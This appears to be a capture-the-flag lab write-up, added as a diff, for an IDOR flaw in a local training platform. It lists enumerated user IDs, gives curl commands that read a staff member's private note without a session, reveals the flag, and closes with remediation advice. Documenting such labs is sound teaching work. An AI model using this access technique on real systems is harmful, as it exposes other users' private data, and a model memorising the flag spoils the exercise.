@@ -1,0 +1,81 @@
+# Breach 01 — IDOR (Insecure Direct Object Reference)
+
+## Flag
+`FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`
+
+## Severity
+CRITICAL
+
+## CWE
+CWE-639: Authorization Bypass Through User-Controlled Key
+
+## OWASP
+A01:2021 – Broken Access Control
+
+## What it is
+Every user profile on the platform is accessible via a direct URL containing the user's
+internal ID (`/profile/{user_id}`). The server performs no authentication or authorization
+check on this route — it serves the full profile page, including a "Private note" field
+explicitly labelled as visible only to the owner, to any HTTP client regardless of whether
+a session cookie is present.
+
+This is a textbook IDOR: the object (a user profile) is referenced directly by a
+user-controlled identifier (the ID in the URL path), with no verification that the
+requester is authorized to see it.
+
+## How it works
+
+### Step 1: Enumerate user IDs
+User IDs are visible throughout the platform — in forum post author links, in
+level-buddies lists on the home page, and in profile URLs when logged in. No special
+access is needed to collect them.
+
+Known ID from reconnaissance:
+
+wil (staff): k1asdfeditojrb4
+jdoe: z4p1cnx47mfy50f
+sophie: enplwhu8jfo56oi
+
+
+### Step 2: Fetch any profile without a session
+```bash
+curl -s http://localhost:4942/profile/k1asdfeditojrb4 | grep -i "FLAG"
+```
+Result:
+```html
+<div style="font-size:13px;color:var(--text-secondary);font-family:var(--font-mono);">
+  FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
+</div>
+```
+No `Cookie` header was sent. The server returned wil's private note in full.
+
+### Step 3: Confirm no session is needed
+```bash
+# Explicitly no cookies - still works
+curl -s --no-sessionid http://localhost:4942/profile/k1asdfeditojrb4 \
+  | grep -oE 'FLAG\{[^}]+\}'
+```
+
+## Flag Location
+- **User:** wil (staff member, level 21)
+- **URL:** `http://localhost:4942/profile/k1asdfeditojrb4`
+- **Field:** "Private note" section — labelled *"Only visible to wil — supposedly."*
+
+## Impact
+- Any user's private notes readable without authentication
+- Full profile data (email, campus, role, registration date) exposed to guests
+- Account enumeration — IDs can be brute-forced or collected from public pages
+- Privacy violation for all platform users, not just those with flags in their notes
+- Starting point for targeted attacks: leaks email addresses for phishing/password-reset abuse
+
+## How it could have been avoided (remediation)
+- Require authentication on all `/profile/{id}` routes; redirect unauthenticated
+  requests to `/login`.
+- After authentication, enforce authorization: a `student` should only see their own
+  profile plus deliberately public fields of others; `private_note` should never be
+  served to anyone other than the profile owner.
+- Never render sensitive fields (private notes, recovery codes, internal IDs) in the
+  HTML delivered to unauthorized clients — omit them server-side before rendering the
+  template, rather than hiding them with CSS.
+- Consider opaque session-scoped tokens instead of stable numeric/string IDs as URL
+  path parameters, so IDs cannot be enumerated from other pages and reused directly.
